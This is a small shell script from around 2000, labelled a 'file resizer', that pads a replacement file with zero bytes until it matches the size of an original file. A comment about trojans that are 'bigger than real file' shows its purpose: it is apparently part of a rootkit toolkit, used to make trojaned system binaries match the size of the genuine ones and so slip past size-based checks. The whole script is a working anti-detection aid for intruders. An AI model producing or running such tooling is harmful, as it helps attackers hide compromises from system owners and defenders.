#!/bin/sh
# File resizer v2.3 (C) 1999-2000 Tragedy/Dor (dor@fortknox.org)
# Purpose: Adds zeroes to a file to match it`s size to another file.
# Disclaimer: The author takes no responsibility for any use, misuse
# or bugs in this program.

if test -n "$2" ; then
WORKING=1
else
echo "Usage: $0 <original file> <new file>"
exit 10
fi

# OS Check - for stupid OS differences
OS=`uname -s`
        case $OS in
                SunOS)
# SunOS or Solaris
                ORIGSIZE=`./ls -lga $1 | awk '{print ""$4""}'`
                TRSIZE=`./ls -lga $2 | awk '{print ""$4""}'`
                        ;;
                Linux)
# Linux
                ORIGSIZE=`ls -lga $1 | awk '{print ""$5""}'`
                TRSIZE=`ls -lga $2 | awk '{print ""$5""}'`
                        ;;
                *)
# Unknown OS ? Winging it
                        ;;
                esac

XTRABYTES=`expr $ORIGSIZE - $TRSIZE`
eep=`expr $ORIGSIZE ">" $TRSIZE`
#echo "$eep"

#echo "Original file size: $ORIGSIZE"
#echo "Size of replacement file $TRSIZE"
#echo "Required $XTRABYTES additional bytes"
TEMPFILE="ARSEX3"

if test $XTRABYTES = "0"; then
#echo "0 Extra bytes required - bailing out"
exit 0
fi

if test $ORIGSIZE -lt $TRSIZE; then
#echo "Trojan is bigger than real file, go code better trojans, IDIOT"
exit 0
fi

dd if=/dev/zero of=./$TEMPFILE bs=1 count=$XTRABYTES >/dev/null 2>&1
touch $TEMPFILE

#echo "Created tempfile $TEMPFILE with $XTRABYTES bytes size"
cat $TEMPFILE >> $2
#echo "New file:"
#./ls -lga $2
rm -f $TEMPFILE

